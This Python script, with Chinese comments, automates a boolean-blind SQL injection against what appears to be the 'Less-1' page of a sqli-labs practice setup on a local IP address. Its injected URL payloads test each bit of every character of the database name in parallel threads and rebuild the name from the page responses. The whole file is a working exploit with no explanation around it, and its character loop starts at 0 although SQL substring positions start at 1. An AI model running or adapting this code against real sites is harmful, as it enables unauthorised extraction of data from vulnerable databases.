import requests

from threading import Thread
def saomiao(i,results,index,m):
#def saomiao(i):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0'

       }
    url_one="http://192.168.136.147/sql/Less-1/?id=1' and (select ascii(substring(database(),"+m+",1))%26 "+ str(i)+"= "+str(i)+" )=1 --+ ";
    #输入&
    #url_one = "http://192.168.136.147/sql/Less-1/?id=1' and (select ascii(substring(database(),1,1))%26 " + str(i) + "= " + str(i) + " )=1 --+ ";
    #print(url_one)
    url_requests=requests.get(url=url_one,headers=headers);
    sucess_1="Your Login name:Dumb";
    if sucess_1 in url_requests.text :
        results[index].append(str(1));
        #results[index].append(1);
    else:
        results[index].append(str(0));
        #results[index].append(0);
def test4(m):
#def test4():
        threads = [None] * 8
        results = [[] for i in range(8)]
        for i in range(8):

            threads[i] = Thread(target=saomiao, args=(pow(2,i), results,i,m))
            #threads[i] = Thread(target=saomiao, args=(pow(2, i), results, i))

            threads[i].start()  # 开始线程
        for i in range(8):
            threads[i].join() # 等待线程结束后退出
        a=results
        b = a[::-1]
        z=''
        for i in range(8):
            z = z + b[i][0]
        c = int((z), 2);
        m = chr(c);
        return m
#print(test4());
m_1=''
for i in range(10):
     m_1+=test4(str(i));
print(m_1);


